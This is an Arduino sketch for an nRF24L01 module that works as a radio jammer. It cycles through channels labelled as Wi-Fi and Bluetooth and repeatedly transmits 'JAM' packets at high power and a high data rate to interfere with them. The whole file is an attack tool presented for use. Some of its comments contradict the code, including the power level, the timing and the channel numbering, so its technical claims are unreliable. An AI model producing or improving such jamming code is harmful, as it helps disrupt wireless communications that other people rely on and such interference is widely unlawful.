#include <SPI.h>
#include <RF24.h>

// Define the CE and CSN pins for nRF24L01 (based on your connections)
#define CE_PIN 5   // D1 (GPIO5)
#define CSN_PIN 4  // D2 (GPIO4)

// Create RF24 object
RF24 radio(CE_PIN, CSN_PIN);

// Define the channels to cycle through
const int channels[] = {0, 1, 6, 11, 37, 39, 62, 80}; // Channels for jamming (Wi-Fi and Bluetooth)
const int numChannels = sizeof(channels) / sizeof(channels[0]);
int currentChannel = 0;

void setup() {
  Serial.begin(115200);
  radio.begin();
  radio.setPALevel(RF24_PA_HIGH);  // Set power level to maximum for more signal strength
  radio.setDataRate(RF24_2MBPS);   // Use a high data rate to maximize interference
  radio.setCRCLength(RF24_CRC_8);  // Set the CRC length to 8 bits (optional)
  radio.openWritingPipe(0xE8E8F0F0E1LL);  // Set an arbitrary address for transmission
}

void loop() {
  // Set the channel for jamming
  radio.setChannel(channels[currentChannel]);
  
  // Send random noise or data to jam the selected channel
  const char data[] = "JAM";
  radio.write(&data, sizeof(data));  // Transmit "JAM" data
  
  // Print the current channel being jammed for debugging
  Serial.println("Jamming channel " + String(channels[currentChannel]) + "...");
  
  // Cycle through the channels
  currentChannel = (currentChannel + 1) % numChannels;  // Increment channel index and wrap around
  
  delay(10);  // Change channel every second (adjust as needed)
}
